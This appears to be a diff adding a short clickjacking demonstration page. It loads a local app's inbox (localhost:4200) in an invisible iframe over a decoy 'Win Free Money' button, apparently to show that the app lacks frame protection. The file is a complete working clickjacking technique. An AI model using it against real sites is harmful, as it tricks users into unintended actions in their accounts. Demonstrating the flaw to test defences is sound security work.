@@ -1,0 +1,30 @@
+<!doctype html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport"
+		  content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<title>ClickJacking Demo</title>
+</head>
+<style>
+	.clickjacking-frame {
+		opacity: 0;
+		z-index: 1;
+	}
+	.clickjacking-btn {
+		background-color: #6DB33F;
+		height: 50px;
+		width: 100px;
+		position: absolute;
+		top: 250px;
+		left: 665px;
+		font-size: 16px;
+		z-index: -1;
+	}
+</style>
+<body>
+	<iframe class="clickjacking-frame" src="http://localhost:4200/app/inbox" width="800" height="800"></iframe>
+	<button type="button" class="clickjacking-btn">Win Free Money</button>
+</body>
+</html>
